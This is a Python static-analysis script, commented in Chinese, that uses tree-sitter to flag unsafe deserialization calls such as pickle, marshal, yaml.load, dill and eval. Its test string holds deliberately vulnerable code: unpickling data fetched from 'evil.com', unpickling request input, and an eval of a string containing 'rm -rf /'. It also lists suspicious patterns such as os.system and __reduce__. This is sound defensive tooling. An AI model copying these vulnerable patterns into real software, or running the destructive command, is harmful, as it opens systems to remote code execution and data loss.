import os
import re
import ast
from tree_sitter import Language, Parser

# 假设已经配置了Python语言路径
from .config_path import language_path

# 加载Python语言
LANGUAGES = {
    'python': Language(language_path, 'python'),
}

# 定义不安全的反序列化漏洞模式
UNSAFE_DESERIALIZATION_VULNERABILITIES = {
    'python': [
        # 检测pickle模块的不安全反序列化
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(pickle|cPickle|_pickle)$',
            'func_pattern': r'^(loads|load|Unpickler)$',
            'message': 'Pickle反序列化函数调用',
            'severity': '严重',
            'risk_type': 'pickle_deserialization'
        },
        # 检测marshal模块
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^marshal$',
            'func_pattern': r'^(loads|load)$',
            'message': 'Marshal反序列化函数调用',
            'severity': '严重',
            'risk_type': 'marshal_deserialization'
        },
        # 检测yaml不安全加载
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(yaml|PyYAML)$',
            'func_pattern': r'^(load|load_all)$',
            'message': 'YAML不安全加载函数调用',
            'severity': '高危',
            'risk_type': 'yaml_deserialization'
        },
        # 检测shelve模块
        {
            'query': '''
                (call
                    function: (identifier) @func_name
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'func_pattern': r'^(open|shelve)$',
            'message': 'Shelve数据库打开调用',
            'severity': '高危',
            'risk_type': 'shelve_deserialization'
        },
        # 检测dill模块
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^dill$',
            'func_pattern': r'^(loads|load)$',
            'message': 'Dill反序列化函数调用',
            'severity': '严重',
            'risk_type': 'dill_deserialization'
        },
        # 检测cloudpickle模块
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^cloudpickle$',
            'func_pattern': r'^(loads|load)$',
            'message': 'Cloudpickle反序列化函数调用',
            'severity': '严重',
            'risk_type': 'cloudpickle_deserialization'
        },
        # 检测直接使用eval进行反序列化
        {
            'query': '''
                (call
                    function: (identifier) @func_name
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'func_pattern': r'^(eval|exec|compile)$',
            'message': '代码执行函数调用',
            'severity': '严重',
            'risk_type': 'code_execution'
        },
        # 检测XML不安全解析
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(xml\.etree\.ElementTree|xml\.dom\.minidom|xml\.sax)$',
            'func_pattern': r'^(fromstring|parse|parseString)$',
            'message': 'XML解析函数调用',
            'severity': '中危',
            'risk_type': 'xml_parsing'
        }
    ]
}

# 用户输入源模式
USER_INPUT_SOURCES = {
    'query': '''
        [
            (call
                function: (identifier) @func_name
                arguments: (argument_list) @args
            )
            (call
                function: (attribute
                    object: (_) @obj
                    attribute: (identifier) @attr
                )
                arguments: (argument_list) @args
            )
        ] @call
    ''',
    'patterns': [
        {
            'func_pattern': r'^(input|raw_input)$',
            'message': '标准输入函数'
        },
        {
            'obj_pattern': r'^(sys\.stdin|stdin)$',
            'attr_pattern': r'^(read|readline|readlines)$',
            'message': '标准输入读取'
        },
        {
            'func_pattern': r'^(getenv)$',
            'message': '环境变量获取'
        },
        {
            'obj_pattern': r'^(sys)$',
            'attr_pattern': r'^(argv)$',
            'message': '命令行参数'
        },
        {
            'obj_pattern': r'^os\.environ$',
            'attr_pattern': r'^(get|__getitem__)$',
            'message': '环境变量获取'
        },
        {
            'obj_pattern': r'^(requests|urllib|urllib2|urllib3|http\.client)$',
            'attr_pattern': r'^(get|post|put|delete|request|urlopen)$',
            'message': '网络输入'
        },
        {
            'obj_pattern': r'^(flask|django|bottle|tornado|fastapi)\.request$',
            'attr_pattern': r'^(args|form|values|data|json|files|headers|cookies|get_json|get_data)$',
            'message': 'Web框架输入'
        },
        {
            'obj_pattern': r'^(socket)$',
            'attr_pattern': r'^(recv|recvfrom|recvmsg)$',
            'message': '网络套接字输入'
        },
        {
            'obj_pattern': r'^(base64)$',
            'attr_pattern': r'^(b64decode|b32decode|b16decode)$',
            'message': 'Base64解码'
        }
    ]
}

# 安全反序列化模式
SAFE_DESERIALIZATION_PATTERNS = {
    'python': [
        {
            'module_pattern': r'^yaml$',
            'func_pattern': r'^(safe_load|safe_load_all)$',
            'message': '安全的YAML加载'
        },
        {
            'module_pattern': r'^json$',
            'func_pattern': r'^(loads|load)$',
            'message': 'JSON加载'
        },
        {
            'module_pattern': r'^xml\.etree\.ElementTree$',
            'func_pattern': r'^(XMLParser)$',
            'message': 'XML解析器'
        }
    ]
}

# 自定义解析器检测
CUSTOM_PARSER_PATTERNS = {
    'query': '''
        (call
            function: (attribute
                object: (identifier) @module
                attribute: (identifier) @func_name
            )
            arguments: (argument_list 
                (_)* @args
                (keyword_argument
                    name: (identifier) @kw_name
                    value: (_) @kw_value
                ) @kw_arg
            )
        ) @call
    ''',
    'patterns': [
        {
            'module_pattern': r'^(pickle|cPickle)$',
            'func_pattern': r'^(Unpickler|loads|load)$',
            'keyword_pattern': r'^.*$',
            'message': 'Pickle自定义解析器'
        },
        {
            'module_pattern': r'^yaml$',
            'func_pattern': r'^(load|load_all)$',
            'keyword_pattern': r'^(Loader)$',
            'message': 'YAML自定义加载器'
        }
    ]
}


def detect_unsafe_deserialization(code, language='python'):
    """
    检测Python代码中不安全的反序列化漏洞

    Args:
        code: Python源代码字符串
        language: 语言类型，默认为'python'

    Returns:
        list: 检测结果列表
    """
    if language not in LANGUAGES:
        return []

    # 初始化解析器
    parser = Parser()
    parser.set_language(LANGUAGES[language])

    # 解析代码
    tree = parser.parse(bytes(code, 'utf8'))
    root = tree.root_node

    vulnerabilities = []
    deserialization_calls = []  # 存储所有反序列化调用
    user_input_sources = []  # 存储用户输入源
    custom_parsers = []  # 存储自定义解析器
    safe_calls = []  # 存储安全调用

    # 第一步：收集所有反序列化调用
    for query_info in UNSAFE_DESERIALIZATION_VULNERABILITIES[language]:
        try:
            query = LANGUAGES[language].query(query_info['query'])
            captures = query.captures(root)

            current_capture = {}
            for node, tag in captures:
                if tag in ['func_name', 'module']:
                    name = node.text.decode('utf8')
                    current_capture[tag] = name
                    current_capture['node'] = node.parent
                    current_capture['line'] = node.start_point[0] + 1
                    current_capture['start_point'] = node.start_point
                    current_capture['end_point'] = node.end_point

                elif tag in ['arg']:
                    current_capture[tag] = node.text.decode('utf8')
                    current_capture['arg_node'] = node

                elif tag == 'call' and current_capture:
                    # 检查模块和函数名是否匹配模式
                    module_pattern = query_info.get('module_pattern', '')
                    func_pattern = query_info.get('func_pattern', '')

                    module_match = True
                    func_match = True

                    if module_pattern and 'module' in current_capture:
                        module_match = bool(re.match(module_pattern, current_capture['module'], re.IGNORECASE))

                    if func_pattern and 'func_name' in current_capture:
                        func_match = bool(re.match(func_pattern, current_capture['func_name'], re.IGNORECASE))

                    if module_match and func_match:
                        code_snippet = node.text.decode('utf8')

                        deserialization_call = {
                            'type': 'deserialization_call',
                            'line': current_capture['line'],
                            'module': current_capture.get('module', ''),
                            'function': current_capture.get('func_name', ''),
                            'argument': current_capture.get('arg', ''),
                            'arg_node': current_capture.get('arg_node'),
                            'code_snippet': code_snippet,
                            'node': node,
                            'severity': query_info.get('severity', '高危'),
                            'risk_type': query_info.get('risk_type', 'unknown'),
                            'original_message': query_info.get('message', ''),
                            'start_point': current_capture.get('start_point'),
                            'end_point': current_capture.get('end_point')
                        }
                        deserialization_calls.append(deserialization_call)
                    current_capture = {}

        except Exception as e:
            print(f"查询错误 {query_info.get('message')}: {e}")
            continue

    # 第二步：收集用户输入源
    try:
        query = LANGUAGES[language].query(USER_INPUT_SOURCES['query'])
        captures = query.captures(root)

        current_capture = {}
        for node, tag in captures:
            if tag in ['func_name', 'obj', 'attr']:
                name = node.text.decode('utf8')
                current_capture[tag] = name
                current_capture['node'] = node.parent
                current_capture['line'] = node.start_point[0] + 1

            elif tag == 'call' and current_capture:
                for pattern_info in USER_INPUT_SOURCES['patterns']:
                    func_pattern = pattern_info.get('func_pattern', '')
                    obj_pattern = pattern_info.get('obj_pattern', '')
                    attr_pattern = pattern_info.get('attr_pattern', '')

                    match = False
                    if func_pattern and 'func_name' in current_capture:
                        if re.match(func_pattern, current_capture['func_name'], re.IGNORECASE):
                            match = True
                    elif obj_pattern and attr_pattern and 'obj' in current_capture and 'attr' in current_capture:
                        if (re.match(obj_pattern, current_capture['obj'], re.IGNORECASE) and
                                re.match(attr_pattern, current_capture['attr'], re.IGNORECASE)):
                            match = True

                    if match:
                        code_snippet = node.text.decode('utf8')
                        user_input_sources.append({
                            'type': 'user_input',
                            'line': current_capture['line'],
                            'function': current_capture.get('func_name', ''),
                            'object': current_capture.get('obj', ''),
                            'attribute': current_capture.get('attr', ''),
                            'code_snippet': code_snippet,
                            'node': node
                        })
                        break

                current_capture = {}

    except Exception as e:
        print(f"用户输入源查询错误: {e}")

    # 第三步：收集自定义解析器
    try:
        query = LANGUAGES[language].query(CUSTOM_PARSER_PATTERNS['query'])
        captures = query.captures(root)

        current_capture = {}
        for node, tag in captures:
            if tag in ['func_name', 'module', 'kw_name']:
                current_capture[tag] = node.text.decode('utf8')
                current_capture['node'] = node.parent
                current_capture['line'] = node.start_point[0] + 1

            elif tag == 'call' and current_capture:
                for pattern_info in CUSTOM_PARSER_PATTERNS['patterns']:
                    module_pattern = pattern_info.get('module_pattern', '')
                    func_pattern = pattern_info.get('func_pattern', '')
                    keyword_pattern = pattern_info.get('keyword_pattern', '')

                    if ('module' in current_capture and 'func_name' in current_capture and
                            'kw_name' in current_capture):

                        module_match = re.match(module_pattern, current_capture['module'],
                                                re.IGNORECASE) if module_pattern else True
                        func_match = re.match(func_pattern, current_capture['func_name'],
                                              re.IGNORECASE) if func_pattern else True
                        kw_match = re.match(keyword_pattern, current_capture['kw_name'],
                                            re.IGNORECASE) if keyword_pattern else True

                        if module_match and func_match and kw_match:
                            code_snippet = node.text.decode('utf8')
                            custom_parsers.append({
                                'line': current_capture['line'],
                                'module': current_capture['module'],
                                'function': current_capture['func_name'],
                                'keyword': current_capture['kw_name'],
                                'code_snippet': code_snippet,
                                'node': node,
                                'message': pattern_info.get('message', '')
                            })
                current_capture = {}

    except Exception as e:
        print(f"自定义解析器查询错误: {e}")

    # 第四步：分析漏洞
    for call in deserialization_calls:
        # 检查是否是安全调用
        if is_safe_deserialization(call):
            safe_calls.append(call)
            continue

        vulnerability_details = analyze_deserialization_vulnerability(
            call, user_input_sources, custom_parsers, root
        )

        if vulnerability_details:
            vulnerabilities.append(vulnerability_details)

    return sorted(vulnerabilities, key=lambda x: x['line'])


def analyze_deserialization_vulnerability(call, user_input_sources, custom_parsers, root):
    """
    分析单个反序列化调用的漏洞
    """
    is_vulnerable = False
    vulnerability_details = {
        'line': call['line'],
        'code_snippet': call['code_snippet'],
        'vulnerability_type': '不安全的反序列化',
        'severity': call['severity'],
        'module': call['module'],
        'function': call['function'],
        'risk_type': call['risk_type']
    }

    # 情况1: pickle/marshal等危险模块
    if call['risk_type'] in ['pickle_deserialization', 'marshal_deserialization',
                             'dill_deserialization', 'cloudpickle_deserialization']:
        vulnerability_details['message'] = (
            f"危险的反序列化模块: {call['module']}.{call['function']} - "
            f"可能允许远程代码执行"
        )
        is_vulnerable = True

    # 情况2: yaml不安全加载
    elif call['risk_type'] == 'yaml_deserialization':
        vulnerability_details['message'] = (
            f"不安全的YAML加载: {call['module']}.{call['function']} - "
            f"应使用yaml.safe_load代替"
        )
        is_vulnerable = True

    # 情况3: 代码执行函数
    elif call['risk_type'] == 'code_execution':
        vulnerability_details['message'] = (
            f"代码执行函数: {call['function']} - "
            f"可能执行任意代码"
        )
        vulnerability_details['severity'] = '严重'
        is_vulnerable = True

    # 情况4: XML外部实体攻击
    elif call['risk_type'] == 'xml_parsing':
        vulnerability_details['message'] = (
            f"XML解析函数: {call['module']}.{call['function']} - "
            f"可能存在XXE漏洞"
        )
        is_vulnerable = True

    # 情况5: 参数来自用户输入
    if call['arg_node'] and is_user_input_related(call['arg_node'], user_input_sources, root):
        vulnerability_details['message'] += " (数据来自用户输入)"
        vulnerability_details['severity'] = elevate_severity(vulnerability_details['severity'])
        is_vulnerable = True

    # 情况6: 自定义解析器可能引入风险
    if has_custom_parser(call, custom_parsers):
        vulnerability_details['message'] += " (使用自定义解析器)"
        is_vulnerable = True

    # 情况7: 检查参数内容
    if call['argument'] and contains_suspicious_patterns(call['argument']):
        vulnerability_details['message'] += " (参数包含可疑模式)"
        is_vulnerable = True

    return vulnerability_details if is_vulnerable else None


def is_safe_deserialization(call):
    """
    检查是否是安全的反序列化调用
    """
    # yaml.safe_load 是安全的
    if call['module'] in ['yaml', 'PyYAML'] and call['function'] in ['safe_load', 'safe_load_all']:
        return True

    # json模块通常是安全的（但需要检查上下文）
    if call['module'] in ['json', 'simplejson'] and call['function'] in ['loads', 'load']:
        # 这里可以添加更复杂的JSON安全检查
        return False  # 暂时返回False，让后续分析决定

    return False


def is_user_input_related(arg_node, user_input_sources, root_node):
    """
    检查参数节点是否与用户输入相关
    """
    arg_text = arg_node.text.decode('utf8')

    # 检查常见的用户输入变量名
    user_input_vars = ['input', 'user_input', 'data', 'json_str', 'request',
                       'response', 'body', 'content', 'payload', 'param',
                       'query', 'form', 'file', 'upload', 'cookie']
    for var in user_input_vars:
        if re.search(rf'\b{var}\b', arg_text, re.IGNORECASE):
            return True

    # 检查是否匹配已知的用户输入源
    for source in user_input_sources:
        if source['node'] == arg_node or is_child_node(arg_node, source['node']):
            return True

    return False


def has_custom_parser(call, custom_parsers):
    """
    检查是否有自定义解析器
    """
    for parser in custom_parsers:
        if (parser['module'] == call['module'] and
                parser['function'] == call['function'] and
                abs(parser['line'] - call['line']) <= 5):  # 允许5行的误差范围
            return True
    return False


def contains_suspicious_patterns(argument):
    """
    检查参数是否包含可疑模式
    """
    suspicious_patterns = [
        r'__reduce__', r'__reduce_ex__', r'__setstate__',
        r'__getattr__', r'__getattribute__', r'__getitem__',
        r'__class__', r'__subclasses__', r'__init__',
        r'__globals__', r'__builtins__', r'__import__',
        r'os\.system', r'subprocess', r'eval', r'exec',
        r'compile', r'open', r'file', r'execfile'
    ]

    for pattern in suspicious_patterns:
        if re.search(pattern, argument, re.IGNORECASE):
            return True

    return False


def elevate_severity(current_severity):
    """
    提升严重程度等级
    """
    severity_levels = {'低危': '中危', '中危': '高危', '高危': '严重', '严重': '严重'}
    return severity_levels.get(current_severity, current_severity)


def is_child_node(child, parent):
    """
    检查一个节点是否是另一个节点的子节点
    """
    node = child
    while node:
        if node == parent:
            return True
        node = node.parent
    return False


def analyze_python_deserialization_vulnerabilities(code_string):
    """
    分析Python代码字符串中的不安全反序列化漏洞
    """
    return detect_unsafe_deserialization(code_string, 'python')


# 示例使用
if __name__ == "__main__":
    # 测试Python代码
    test_python_code = """
import pickle
import cPickle
import marshal
import yaml
import dill
import cloudpickle
import requests
from flask import request
import xml.etree.ElementTree as ET

def vulnerable_deserialization():
    # 1. pickle直接反序列化用户输入 - 严重
    user_data = request.files['data'].read()
    obj = pickle.loads(user_data)  # 严重漏洞 - 远程代码执行

    # 2. cPickle同样危险
    malicious_data = requests.get("http://evil.com/data.pkl").content
    obj = cPickle.loads(malicious_data)  # 严重漏洞

    # 3. marshal反序列化
    serialized_data = b'...'
    data = marshal.loads(serialized_data)  # 严重漏洞

    # 4. yaml不安全加载
    yaml_config = request.get_json().get('config')
    config = yaml.load(yaml_config)  # 高危漏洞

    # 5. dill反序列化
    dill_data = input("Enter dill data: ")
    obj = dill.loads(dill_data)  # 严重漏洞

    # 6. cloudpickle反序列化
    cloud_data = request.cookies.get('session_data')
    session = cloudpickle.loads(cloud_data)  # 严重漏洞

    # 7. 自定义Unpickler
    class CustomUnpickler(pickle.Unpickler):
        def find_class(self, module, name):
            return super().find_class(module, name)

    file_data = open('data.pkl', 'rb').read()
    unpickler = CustomUnpickler(file_data)  # 危险

    # 8. XML外部实体
    xml_data = request.data
    root = ET.fromstring(xml_data)  # 可能存在XXE

    # 9. eval用于反序列化
    json_like_data = '{"__class__": "os.system", "__args__": ["rm -rf /"]}'
    data = eval(json_like_data)  # 严重漏洞

def safe_usage():
    # 1. 安全的YAML加载
    safe_yaml = yaml.safe_load('key: value')  # 安全

    # 2. 硬编码的pickle数据（仍然危险，但风险较低）
    known_safe_data = b'...'
    # obj = pickle.loads(known_safe_data)  # 不推荐

    # 3. 来自可信源的JSON
    import json
    trusted_json = '{"name": "test"}'
    data = json.loads(trusted_json)  # 相对安全

    # 4. 安全的XML解析（禁用外部实体）
    parser = ET.XMLParser()
    parser.entity = {}
    safe_xml = '<root>test</root>'
    root = ET.fromstring(safe_xml, parser=parser)  # 相对安全

def deserialization_with_validation():
    # 带有基本验证的反序列化
    user_input = request.args.get('data')

    # 基本检查
    if user_input and len(user_input) < 1000:
        try:
            # 但仍然危险！
            data = pickle.loads(user_input.encode())
            return data
        except:
            pass
    return None

if __name__ == "__main__":
    vulnerable_deserialization()
    safe_usage()
    deserialization_with_validation()
"""

    print("=" * 70)
    print("Python不安全反序列化漏洞检测")
    print("=" * 70)

    results = analyze_python_deserialization_vulnerabilities(test_python_code)

    if results:
        print(f"检测到 {len(results)} 个潜在漏洞:\n")
        for i, vuln in enumerate(results, 1):
            print(f"{i}. 行号 {vuln['line']}: {vuln['message']}")
            print(f"   代码片段: {vuln['code_snippet'][:80]}...")
            print(f"   漏洞类型: {vuln['vulnerability_type']}")
            print(f"   风险类型: {vuln['risk_type']}")
            print(f"   严重程度: {vuln['severity']}")
            print(f"   模块函数: {vuln.get('module', '')}.{vuln.get('function', '')}")
            print("-" * 50)
    else:
        print("未检测到不安全反序列化漏洞")